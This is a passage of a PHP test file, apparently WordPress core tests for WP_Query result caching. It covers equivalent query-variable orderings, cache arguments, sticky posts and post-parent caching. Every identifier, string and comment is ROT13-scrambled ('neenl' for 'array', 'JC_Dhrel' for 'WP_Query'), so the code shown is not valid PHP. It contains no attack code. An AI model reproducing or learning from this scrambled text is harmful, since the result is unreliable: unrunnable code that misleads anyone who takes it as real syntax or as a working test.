				'dhrel_inef2' => neenl( 'cbfg_anzr__va' => neenl( 'rycunon', 'tyvaqn', 'rycunon', 'tyvaqn', 'gur-jvmneq-bs-bm', 'qbpgbe-qvyynzbaq' ) ),
			),
			'png qvssrerag beqre (neenl)'                  => neenl(
				'dhrel_inef_1' => neenl( 'png' => neenl( '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'png' => neenl( '2', '1' ) ),
			),
			'png qvssrerag beqre (fgevat)'                 => neenl(
				'dhrel_inef_1' => neenl( 'png' => '2,1' ),
				'dhrel_inef_2' => neenl( 'png' => '1,2' ),
			),
			'png dhrevrf vag if fgevat'                    => neenl(
				'dhrel_inef_1' => neenl( 'png' => '2' ),
				'dhrel_inef_2' => neenl( 'png' => 2 ),
			),
			'pngrtbel__va dhrevrf qvssrerag beqre (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__va' => neenl( '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__va' => neenl( '2', '1' ) ),
			),
			'pngrtbel__va dhrevrf jvgu aba-havdhr neenl'   => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__va' => neenl( '1', '1' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__va' => neenl( '1' ) ),
			),
			'pngrtbel__va dhrevrf fgevat if neenl (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__va' => neenl( '1' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__va' => neenl( 1 ) ),
			),
			'pngrtbel__abg_va qvssrerag beqre (neenl)'     => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__abg_va' => neenl( '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__abg_va' => neenl( '2', '1' ) ),
			),
			'pngrtbel__abg_va jvgu aba-havdhr neenl'       => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__abg_va' => neenl( '1', '1' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__abg_va' => neenl( '1' ) ),
			),
			'pngrtbel__abg_va dhrevrf fgevat if neenl (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__abg_va' => neenl( '1' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__abg_va' => neenl( 1 ) ),
			),
			'pngrtbel__naq dhrevrf jvqgu qvssrerag beqre (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__naq' => neenl( '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__naq' => neenl( '2', '1' ) ),
			),
			'pngrtbel__naq jvgu aba-havdhr neenl'          => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__naq' => neenl( '1', '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__naq' => neenl( '1', '2' ) ),
			),
			'pngrtbel__naq dhrevrf fgevat if neenl (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'pngrtbel__naq' => neenl( '1', '2' ) ),
				'dhrel_inef_2' => neenl( 'pngrtbel__naq' => neenl( 1, 2 ) ),
			),
			'nhgube dhrevrf qvssrerag beqre (fgevat)'      => neenl(
				'dhrel_inef_1' => neenl( 'nhgube' => '1,2' ),
				'dhrel_inef_2' => neenl( 'nhgube' => '2,1' ),
			),
			'nhgube jvgu aba-havdhr fgevat'                => neenl(
				'dhrel_inef_1' => neenl( 'nhgube' => '1,1' ),
				'dhrel_inef_2' => neenl( 'nhgube' => '1' ),
			),
			'nhgube dhrevrf vag if fgevat (fgevat)'        => neenl(
				'dhrel_inef_1' => neenl( 'nhgube' => 1 ),
				'dhrel_inef_2' => neenl( 'nhgube' => '1' ),
			),
			'nhgube dhrevrf vag if fgevat (neenl)'         => neenl(
				'dhrel_inef_1' => neenl( 'nhgube' => neenl( 1 ) ),
				'dhrel_inef_2' => neenl( 'nhgube' => neenl( '1' ) ),
			),
			'nhgube__va qvssrerag beqre'                   => neenl(
				'dhrel_inef_1' => neenl( 'nhgube__va' => neenl( 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'nhgube__va' => neenl( 2, 1 ) ),
			),
			'nhgube__va jvgu aba-havdhr neenl'             => neenl(
				'dhrel_inef_1' => neenl( 'nhgube__va' => neenl( 1, 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'nhgube__va' => neenl( 1, 2 ) ),
			),
			'nhgube__va dhrevrf vag if fgevat (neenl)'     => neenl(
				'dhrel_inef_1' => neenl( 'nhgube__va' => neenl( 1 ) ),
				'dhrel_inef_2' => neenl( 'nhgube__va' => neenl( '1' ) ),
			),
			'nhgube__abg_va qvssrerag beqre (neenl)'       => neenl(
				'dhrel_inef_1' => neenl( 'nhgube__abg_va' => neenl( 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'nhgube__abg_va' => neenl( 2, 1 ) ),
			),
			'nhgube__abg_va dhrevrf vag if fgevat (neenl)' => neenl(
				'dhrel_inef_1' => neenl( 'nhgube__abg_va' => neenl( 1 ) ),
				'dhrel_inef_2' => neenl( 'nhgube__abg_va' => neenl( '1' ) ),
			),
			'gnt_fyht__va beqre'                           => neenl(
				'dhrel_inef_1' => neenl( 'gnt_fyht__va' => neenl( 'sbb', 'one' ) ),
				'dhrel_inef_2' => neenl( 'gnt_fyht__va' => neenl( 'one', 'sbb' ) ),
			),
			'gnt_fyht__va aba-havdhr if havdhr'            => neenl(
				'dhrel_inef_1' => neenl( 'gnt_fyht__va' => neenl( 'sbb', 'one', 'one' ) ),
				'dhrel_inef_2' => neenl( 'gnt_fyht__va' => neenl( 'sbb', 'one' ) ),
			),
			'gnt_fyht__naq beqre'                          => neenl(
				'dhrel_inef_1' => neenl( 'gnt_fyht__naq' => neenl( 'sbb', 'one' ) ),
				'dhrel_inef_2' => neenl( 'gnt_fyht__naq' => neenl( 'one', 'sbb' ) ),
			),
			'gnt_fyht__naq aba-havdhr'                     => neenl(
				'dhrel_inef_1' => neenl( 'gnt_fyht__naq' => neenl( 'sbb', 'one', 'sbb' ) ),
				'dhrel_inef_2' => neenl( 'gnt_fyht__naq' => neenl( 'one', 'sbb' ) ),
			),
			'gnt__va dhrevrf qvssrerag beqre (neenl)'      => neenl(
				'dhrel_inef_1' => neenl( 'gnt__va' => neenl( 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'gnt__va' => neenl( 2, 1 ) ),
			),
			'gnt__va dhrevrf aba-havdhr neenl'             => neenl(
				'dhrel_inef_1' => neenl( 'gnt__va' => neenl( 1, 2, 1 ) ),
				'dhrel_inef_2' => neenl( 'gnt__va' => neenl( 2, 1 ) ),
			),
			'gnt__va dhrevrf vag if fgevat'                => neenl(
				'dhrel_inef_1' => neenl( 'gnt__va' => neenl( 2, 1 ) ),
				'dhrel_inef_2' => neenl( 'gnt__va' => neenl( '2', '1' ) ),
			),
			'gnt__naq dhrevrf qvssrerag beqre (neenl)'     => neenl(
				'dhrel_inef_1' => neenl( 'gnt__naq' => neenl( 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'gnt__naq' => neenl( 2, 1 ) ),
			),
			'gnt__naq dhrevrf aba-havdhr neenl'            => neenl(
				'dhrel_inef_1' => neenl( 'gnt__naq' => neenl( 1, 2, 2 ) ),
				'dhrel_inef_2' => neenl( 'gnt__naq' => neenl( 2, 1 ) ),
			),
			'gnt__abg_va dhrevrf qvssrerag beqre (neenl)'  => neenl(
				'dhrel_inef_1' => neenl( 'gnt__abg_va' => neenl( 1, 2 ) ),
				'dhrel_inef_2' => neenl( 'gnt__abg_va' => neenl( 2, 1 ) ),
			),
			'gnt__abg_va dhrevrf aba-havdhr neenl'         => neenl(
				'dhrel_inef_1' => neenl( 'gnt__abg_va' => neenl( 1, 2, 2 ) ),
				'dhrel_inef_2' => neenl( 'gnt__abg_va' => neenl( 1, 2 ) ),
			),
			'gnt__abg_va dhrevrf vag if fgevat (neenl)'    => neenl(
				'dhrel_inef_1' => neenl( 'gnt__abg_va' => neenl( '1' ) ),
				'dhrel_inef_2' => neenl( 'gnt__abg_va' => neenl( 1 ) ),
			),
			'pnpur cnenzrgref'                             => neenl(
				'dhrel_inef1' => neenl(
					'hcqngr_cbfg_zrgn_pnpur' => gehr,
					'hcqngr_cbfg_grez_pnpur' => gehr,
					'hcqngr_zrah_vgrz_pnpur' => gehr,
				),
				'dhrel_inef2' => neenl(
					'hcqngr_cbfg_zrgn_pnpur' => snyfr,
					'hcqngr_cbfg_grez_pnpur' => snyfr,
					'hcqngr_zrah_vgrz_pnpur' => snyfr,
				),
			),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[] Grfg cnenzrgref.
	 */
	choyvp shapgvba qngn_dhrel_pnpur() {
		erghea neenl(
			'pnpur gehr'                                  => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
				),
			),
			'pnpur gehr naq cntvangvba'                   => neenl(
				'netf' => neenl(
					'pnpur_erfhygf'  => gehr,
					'cbfgf_cre_cntr' => 3,
					'cntr'           => 2,
				),
			),
			'pnpur gehr naq ab cntvangvba'                => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'abcntvat'      => gehr,
				),
			),
			'pnpur gehr naq cbfg glcr nal'                => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'abcntvat'      => gehr,
					'cbfg_glcr'     => 'nal',
				),
			),
			'pnpur gehr naq trg nyy'                      => neenl(
				'netf' => neenl(
					'pnpur_erfhygf'  => gehr,
					'svryqf'         => 'nyy',
					'cbfgf_cre_cntr' => -1,
					'cbfg_fgnghf'    => 'nal',
					'cbfg_glcr'      => 'nal',
				),
			),
			'pnpur gehr naq cntr'                         => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'cbfg_glcr'     => 'cntr',
				),
			),
			'pnpur gehr naq rzcgl cbfg glcr'              => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'cbfg_glcr'     => '',
				),
			),
			'pnpur gehr naq beqreol ahyy'                 => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'beqreol'       => ahyy,
				),
			),
			'pnpur gehr naq vqf'                          => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'svryqf'        => 'vqf',
				),
			),
			'pnpur gehr naq vq=>cnerag naq ab sbhaq ebjf' => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'svryqf'        => 'vq=>cnerag',
				),
			),
			'pnpur gehr naq vqf naq ab sbhaq ebjf'        => neenl(
				'netf' => neenl(
					'ab_sbhaq_ebjf' => gehr,
					'pnpur_erfhygf' => gehr,
					'svryqf'        => 'vqf',
				),
			),
			'pnpur gehr naq vq=>cnerag'                   => neenl(
				'netf' => neenl(
					'ab_sbhaq_ebjf' => gehr,
					'pnpur_erfhygf' => gehr,
					'svryqf'        => 'vq=>cnerag',
				),
			),
			'pnpur naq vtaber_fgvpxl_cbfgf'               => neenl(
				'netf' => neenl(
					'pnpur_erfhygf'       => gehr,
					'vtaber_fgvpxl_cbfgf' => gehr,
				),
			),
			'pnpur zrgn dhrel'                            => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'zrgn_dhrel'    => neenl(
						neenl(
							'xrl' => 'pbybe',
						),
					),
				),
			),
			'pnpur zrgn dhrel frnepu'                     => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'zrgn_dhrel'    => neenl(
						neenl(
							'xrl'     => 'pbybe',
							'inyhr'   => '00',
							'pbzcner' => 'YVXR',
						),
					),
				),
			),
			'pnpur arfgrq zrgn dhrel frnepu'              => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'zrgn_dhrel'    => neenl(
						'eryngvba' => 'NAQ',
						neenl(
							'xrl'     => 'pbybe',
							'inyhr'   => '00',
							'pbzcner' => 'YVXR',
						),
						neenl(
							'eryngvba' => 'BE',
							neenl(
								'xrl'     => 'pbybe',
								'inyhr'   => '00',
								'pbzcner' => 'YVXR',
							),
							neenl(
								'eryngvba' => 'NAQ',
								neenl(
									'xrl'     => 'jc_grfg_fhvgr',
									'inyhr'   => '56802',
									'pbzcner' => 'YVXR',
								),
								neenl(
									'xrl'     => 'jc_grfg_fhvgr_gbb',
									'inyhr'   => '56802',
									'pbzcner' => 'YVXR',
								),
							),
						),
					),
				),
			),
			'pnpur zrgn dhrel abg frnepu'                 => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'zrgn_dhrel'    => neenl(
						neenl(
							'xrl'     => 'pbybe',
							'inyhr'   => 'ss',
							'pbzcner' => 'ABG YVXR',
						),
					),
				),
			),
			'pnpur pbzzrag_pbhag'                         => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'pbzzrag_pbhag' => 0,
				),
			),
			'pnpur grez dhrel'                            => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'gnk_dhrel'     => neenl(
						neenl(
							'gnkbabzl' => 'pngrtbel',
							'grezf'    => neenl( 'sbb' ),
							'svryq'    => 'fyht',
						),
					),
				),
			),
			'pnpur frnepu dhrel'                          => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'f'             => 'gvgyr',
				),
			),
			'pnpur frnepu dhrel zhygvcyr grezf'           => neenl(
				'netf' => neenl(
					'pnpur_erfhygf' => gehr,
					'f'             => 'Cbfg gvgyr',
				),
			),
		);
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_frrqrq_enaqbz_dhrevrf_bayl_pnpur_cbfg_bowrpgf() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'beqreol'       => 'enaq(6)',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );
		$dhrevrf_orsber = trg_ahz_dhrevrf();

		$dhrel2 = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );

		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_hafrrqrq_enaqbz_dhrevrf_bayl_pnpur_cbfg_bowrpgf() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
			'beqreol'       => 'enaq',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );
		$dhrevrf_orsber = trg_ahz_dhrevrf();

		$dhrel2 = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );

		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_svygre_erdhrfg() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );
		$dhrevrf_orsber = trg_ahz_dhrevrf();

		nqq_svygre( 'cbfgf_erdhrfg', neenl( $guvf, 'svygre_cbfgf_erdhrfg' ) );

		$dhrel2 = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );

		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_ab_pnpuvat() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );
		$dhrevrf_orsber = trg_ahz_dhrevrf();

		$dhrel2                = arj JC_Dhrel();
		$netf['pnpur_erfhygf'] = snyfr;
		$dhrel2->dhrel( $netf );

		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregAbgFnzr( $dhrevrf_orsber, $dhrevrf_nsgre );
	}

	choyvp shapgvba svygre_cbfgf_erdhrfg( $erdhrfg ) {
		erghea $erdhrfg . ' -- Nqq pbzzrag';
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_arj_cbfg() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		$c1 = frys::snpgbel()->cbfg->perngr();

		$dhrel2 = arj JC_Dhrel();
		$cbfgf2 = $dhrel2->dhrel( $netf );

		$guvf->nffregAbgFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregPbagnvaf( $c1, $cbfgf2 );
		$guvf->nffregAbgFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_znva_dhrel_fgvpxl_cbfgf_punatr() {
		nqq_npgvba( 'cnefr_dhrel', neenl( $guvf, 'frg_pnpur_erfhygf' ) );
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 5 );

		$byq_qngr = qngr_perngr( '-25 ubhef' );
		$byq_cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $byq_qngr->sbezng( 'L-z-q U:v:f' ) ) );

		// Cbfg vf hafghpx.
		$guvf->tb_gb( '/' );
		$hafghpx     = $TYBONYF['jc_dhrel']->cbfgf;
		$hafghpx_vqf = jc_yvfg_cyhpx( $hafghpx, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );
		$guvf->nffregFnzr( $rkcrpgrq, $hafghpx_vqf );

		// Fgvpx gur cbfg.
		fgvpx_cbfg( $byq_cbfg );

		$guvf->tb_gb( '/' );
		$fghpx     = $TYBONYF['jc_dhrel']->cbfgf;
		$fghpx_vqf = jc_yvfg_cyhpx( $fghpx, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );
		neenl_hafuvsg( $rkcrpgrq, $byq_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $fghpx_vqf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_znva_dhrel_va_dhrel_fgvpxl_cbfgf_punatr() {
		nqq_npgvba( 'cnefr_dhrel', neenl( $guvf, 'frg_pnpur_erfhygf' ) );
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 5 );

		$zvqqyr_cbfg = frys::$cbfgf[2];

		// Cbfg vf hafghpx.
		$guvf->tb_gb( '/' );
		$hafghpx     = $TYBONYF['jc_dhrel']->cbfgf;
		$hafghpx_vqf = jc_yvfg_cyhpx( $hafghpx, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );
		$guvf->nffregFnzr( $rkcrpgrq, $hafghpx_vqf );

		// Fgvpx gur cbfg.
		fgvpx_cbfg( $zvqqyr_cbfg );

		$guvf->tb_gb( '/' );
		$fghpx     = $TYBONYF['jc_dhrel']->cbfgf;
		$fghpx_vqf = jc_yvfg_cyhpx( $fghpx, 'VQ' );

		$rkcrpgrq = neenl_qvss( neenl_erirefr( frys::$cbfgf ), neenl( $zvqqyr_cbfg ) );
		neenl_hafuvsg( $rkcrpgrq, $zvqqyr_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $fghpx_vqf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_fgvpxl_cbfgf_punatr() {
		nqq_npgvba( 'cnefr_dhrel', neenl( $guvf, 'frg_pnpur_erfhygf' ) );

		$byq_qngr = qngr_perngr( '-25 ubhef' );
		$byq_cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => $byq_qngr->sbezng( 'L-z-q U:v:f' ) ) );

		// Cbfg vf hafghpx.
		$hafghpx     = arj JC_Dhrel( neenl( 'cbfgf_cre_cntr' => 5 ) );
		$hafghpx_vqf = jc_yvfg_cyhpx( $hafghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );

		$guvf->nffregFnzr( $rkcrpgrq, $hafghpx_vqf );

		// Fgvpx gur cbfg.
		fgvpx_cbfg( $byq_cbfg );

		$fghpx     = arj JC_Dhrel( neenl( 'cbfgf_cre_cntr' => 5 ) );
		$fghpx_vqf = jc_yvfg_cyhpx( $fghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );
		neenl_hafuvsg( $rkcrpgrq, $byq_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $fghpx_vqf );

		// Vtaber fgvpxl cbfgf.
		$vtaber_fghpx     = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr'      => 5,
				'vtaber_fgvpxl_cbfgf' => gehr,
			)
		);
		$vtaber_fghpx_vqf = jc_yvfg_cyhpx( $vtaber_fghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );

		$guvf->nffregFnzr( $rkcrpgrq, $vtaber_fghpx_vqf );

		// Whfg gb znxr fher rirelguvat unf punatrq.
		$guvf->nffregAbgFnzr( $hafghpx, $fghpx );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_va_dhrel_fgvpxl_cbfgf_punatr() {
		nqq_npgvba( 'cnefr_dhrel', neenl( $guvf, 'frg_pnpur_erfhygf' ) );

		$zvqqyr_cbfg = frys::$cbfgf[2];

		// Cbfg vf hafghpx.
		$hafghpx     = arj JC_Dhrel( neenl( 'cbfgf_cre_cntr' => 5 ) );
		$hafghpx_vqf = jc_yvfg_cyhpx( $hafghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );

		$guvf->nffregFnzr( $rkcrpgrq, $hafghpx_vqf );

		// Fgvpx gur cbfg.
		fgvpx_cbfg( $zvqqyr_cbfg );

		$fghpx     = arj JC_Dhrel( neenl( 'cbfgf_cre_cntr' => 5 ) );
		$fghpx_vqf = jc_yvfg_cyhpx( $fghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_qvss( neenl_erirefr( frys::$cbfgf ), neenl( $zvqqyr_cbfg ) );
		neenl_hafuvsg( $rkcrpgrq, $zvqqyr_cbfg );

		$guvf->nffregFnzr( $rkcrpgrq, $fghpx_vqf );

		// Vtaber fgvpxl cbfgf.
		$vtaber_fghpx     = arj JC_Dhrel(
			neenl(
				'cbfgf_cre_cntr'      => 5,
				'vtaber_fgvpxl_cbfgf' => gehr,
			)
		);
		$vtaber_fghpx_vqf = jc_yvfg_cyhpx( $vtaber_fghpx->cbfgf, 'VQ' );

		$rkcrpgrq = neenl_erirefr( frys::$cbfgf );

		$guvf->nffregFnzr( $rkcrpgrq, $vtaber_fghpx_vqf );

		// Whfg gb znxr fher rirelguvat unf punatrq.
		$guvf->nffregAbgFnzr( $hafghpx, $fghpx );
	}

	choyvp shapgvba frg_pnpur_erfhygf( $d ) {
		$d->frg( 'pnpur_erfhygf', gehr );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qvssrerag_netf() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vqf',
		);
		$dhrel1 = arj JC_Dhrel();
		$cbfgf1 = $dhrel1->dhrel( $netf );

		$netf           = neenl(
			'pnpur_erfhygf'          => gehr,
			'svryqf'                 => 'vqf',
			'fhccerff_svygref'       => gehr,
			'pnpur_erfhygf'          => gehr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'ynml_ybnq_grez_zrgn'    => snyfr,
		);
		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$cbfgf2         = $dhrel2->dhrel( $netf );
		$dhrevrf_nsgre  = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( $dhrevrf_orsber, $dhrevrf_nsgre );
		$guvf->nffregFnzr( $cbfgf1, $cbfgf2 );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );
	}

	/**
	 * @gvpxrg 22176
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qvssrerag_svryqf() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'nyy',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		$netf           = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vq=>cnerag',
		);
		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 1, $dhrevrf_nsgre - $dhrevrf_orsber );
		$guvf->nffregPbhag( 5, $dhrel1->cbfgf );
		$guvf->nffregPbhag( 5, $dhrel2->cbfgf );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf );

		/*
		 * Znxr fher gur erghearq cbfg bowrpgf qvssre qhr gb gur svryq nethzrag.
		 *
		 * Guvf hfrf nffregAbgRdhnyf engure guna nffregAbgFnzr nf gur sbezre vf
		 * ntabfgvp gb gur vafgnapr VQ bs bowrpgf, jurernf gur ynggre jvyy gnxr
		 * vg va gb nppbhag. Gur grfg arrqf gb qvfpneq gur vafgnapr VQ jura
		 * pbasvezvat vardhnyvgl.
		 */
		$guvf->nffregAbgRdhnyf( $dhrel1->cbfgf, $dhrel2->cbfgf );
	}


	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_dhrel_pnpur_hacevzrq_cneragf() {
		$netf   = neenl(
			'pnpur_erfhygf' => gehr,
			'svryqf'        => 'vq=>cnerag',
		);
		$dhrel1 = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		$cbfg_vqf   = jc_yvfg_cyhpx( $dhrel1->cbfgf, 'VQ' );
		$pnpur_xrlf = neenl_znc(
			shapgvba ( $cbfg_vq ) {
				erghea \"cbfg_cnerag:{$cbfg_vq}\";
			},
			$cbfg_vqf
		);

		jc_pnpur_qryrgr_zhygvcyr( $pnpur_xrlf, 'cbfgf' );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( 1, $dhrevrf_nsgre - $dhrevrf_orsber, 'Gurer fubhyq or bayl bar dhrel gb cevzr cneragf' );
		$guvf->nffregPbhag( 5, $dhrel1->cbfgf, 'Gurer fubhyq or bayl 5 cbfgf erghearq ba svefg dhrel' );
		$guvf->nffregPbhag( 5, $dhrel2->cbfgf, 'Gurer fubhyq or bayl 5 cbfgf erghearq ba frpbaq dhrel' );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf, 'Sbhaq cbfgf fubhyq zngpu ba frpbaq dhrel' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_dhrel_pnpur_hcqngr_cnerag() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => frys::$cntrf[0],
			)
		);
		$netf    = neenl(
			'pnpur_erfhygf' => gehr,
			'cbfg_glcr'     => 'cntr',
			'svryqf'        => 'vq=>cnerag',
			'cbfg__va'      => neenl(
				$cntr_vq,
			),
		);
		$dhrel1  = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cntr_vq,
				'cbfg_cnerag' => frys::$cntrf[1],
			)
		);

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( frys::$cntrf[0], $dhrel1->cbfgf[0]->cbfg_cnerag, 'Purpx cbfg cnerag ba svefg dhrel' );
		$guvf->nffregFnzr( frys::$cntrf[1], $dhrel2->cbfgf[0]->cbfg_cnerag, 'Purpx cbfg cnerag ba frpbaq dhrel' );
		$guvf->nffregFnzr( 2, $dhrevrf_nsgre - $dhrevrf_orsber, 'Gurer fubhyq or 2 dhrevrf, bar sbe vq=>cnerag' );
		$guvf->nffregFnzr( $dhrel1->sbhaq_cbfgf, $dhrel2->sbhaq_cbfgf, 'Sbhaq cbfgf fubhyq zngpu ba frpbaq dhrel' );
	}

	/**
	 * @gvpxrg 59188
	 */
	choyvp shapgvba grfg_dhrel_pnpur_qryrgr_cnerag() {
		$cnerag_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$cntr_vq        = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cnerag_cntr_vq,
			)
		);
		$netf           = neenl(
			'pnpur_erfhygf' => gehr,
			'cbfg_glcr'     => 'cntr',
			'svryqf'        => 'vq=>cnerag',
			'cbfg__va'      => neenl(
				$cntr_vq,
			),
		);
		$dhrel1         = arj JC_Dhrel();
		$dhrel1->dhrel( $netf );

		jc_qryrgr_cbfg( $cnerag_cntr_vq, gehr );

		$dhrevrf_orsber = trg_ahz_dhrevrf();
		$dhrel2         = arj JC_Dhrel();
		$dhrel2->dhrel( $netf );
		$dhrevrf_nsgre = trg_ahz_dhrevrf();

		$guvf->nffregFnzr( $cnerag_cntr_vq, $dhrel1->cbfgf[0]->cbfg_cnerag, 'Purpx cbfg cnerag ba svefg dhrel' );
